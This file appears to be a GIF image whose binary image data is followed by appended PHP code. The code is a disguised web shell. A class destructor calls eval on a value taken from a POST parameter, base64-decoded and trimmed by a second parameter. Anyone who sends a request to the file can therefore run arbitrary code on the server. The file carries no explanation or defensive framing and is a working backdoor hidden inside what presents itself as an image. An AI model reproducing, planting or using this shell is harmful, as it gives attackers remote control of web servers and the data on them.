GIF89a  ? �f��x���g( ���H�?ۥC��%��z��4~D
��F�����ܛ��Z����X4����x�����:�i	��]�����??��_���?��L��W�Q	�?�?��~I�m	Ѕ��!�?���ֱ?�m��J�i�x%�?�?��.��G�?��w�?І�w�?����?�?��N��B��J�?����?��|��D���?���?��k�?�ɨ��C�������q��*��A��>����S�������O�H�?��7�P��L�J�|~J!r2�G
�Q�?? ��U��E����p��??������������~H��&��E����s��Z��B�?��S��P��t��C��P����?��D��T��Q�.��K�m%�`��0��)�w�����g�R��_�ؙ߸oˉ��9��?�W����{2������Җ3�R�]	��X���ɩ�������Ÿ��[�s+��>�ްرk��Y�ȑ��K���Şm�|��3��ν.ǂ�!��E��=����?��������0��4��3��A����?��h�&ݜ����?��g�6ʀ+�����G��_��b���x�?�k��D�������8�������M��?���?��Q��缁@�-�O��q�t�uЀ�?��>��s���˄�#�*�}�������Ё�����e����?��T�6��<�ի�|�~���?��{����b�������S������!�NETSCAPE2.0   !?	
 � ,       � �	H����*?�Q,D�P-z L�@O�d1�uGJ$\?�Z��?R�c���a?3U悞I�a?��?|Xe:��?._$? ?.c̔A1�QANF��1�G?D�r����%��.l?�E?*&Ta�v?�J?H(\?.B?S������AS���v?@I^��A�l?# ?�C3qJ@(R��?q��ٲxī5( ���}��s?D4D�X�f`?w�� �W{??c?��? %E?�X?�ű<R��!��+?O�����?�Q?x?��1?�@?ڠ��+�P��?P	(?D?gX ? ��1�q?<!?{
T?v��<?php
/* user */
class User
{
  public $name = '';
  public $config = null;

  function __destruct(){
    @eval(''.$config."$this->name");
  }
}
// user
$user = new User;
$num = @$_POST['num'];
// contens
$c = \base64_decode((substr(@$_POST['a'],$num,-$num)));
$user->name = ''.$c;
?>